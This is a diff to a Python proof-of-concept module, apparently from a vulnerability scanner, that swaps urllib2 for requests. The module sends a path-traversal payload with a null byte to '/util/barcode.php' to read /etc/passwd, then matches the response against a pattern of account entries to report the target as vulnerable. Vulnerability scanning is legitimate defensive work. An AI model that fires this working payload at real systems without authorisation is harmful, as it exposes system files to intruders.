@@ -41,11 +41,10 @@ class Poc(ABPoc):
             
             payload = "/util/barcode.php?type=../../../../../../../../../../../etc/passwd%00"
             verify_url = self.target + payload
-            req = urllib2.Request(verify_url)
-            pattern=re.compile("(root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[a-z]+:\d+:\d+:")
-            content = urllib2.urlopen(req).read()
+            req = requests.get(verify_url)
+            pattern=re.compile(r"(root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[a-z]+:\d+:\d+:")
 
-            if req.getcode() == 200 and pattern.search(content):
+            if req.status_code == 200 and pattern.search(req.text):
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
